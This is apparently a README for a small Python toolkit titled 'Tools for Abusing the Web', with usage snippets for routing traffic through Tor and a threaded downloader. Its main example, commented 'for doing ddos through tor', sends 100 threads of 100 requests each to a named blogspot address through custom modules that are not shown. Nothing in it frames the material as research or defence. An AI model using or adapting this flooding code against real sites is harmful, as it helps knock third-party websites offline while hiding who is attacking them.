#Tools for Abusing the Web

####Dependencies
1. `fake_useragent`
2. `tor` on macport
3. `pysocks`



####Let's Begin!


First configure and run tor in the terminal for anonymity. Make sure that the host is 127.0.0.1 and the port number is 9050. These are Tor's default settings.

```
user$ tor
```
To connect to tor, just do. From now, every connection through urllib and sockets will run through the tor port.

```python
import tor

tor.connect(printing = False)
```

"""
REQUESTS
"""
import requestors as r

# for doing ddos through tor

url = "https://manette612.blogspot.com"

# create 100 threads, each sending 100 requests to the url
# the link created counts the number of requests sent
r.structured_sr(url, 100, 100)


"""
DOWNLOAD
"""


"""
links = [
	(link, path, name)
	for download_object in download_list
]

"""

# a threaded download library
n_threads = 4
download(links, n_threads)
```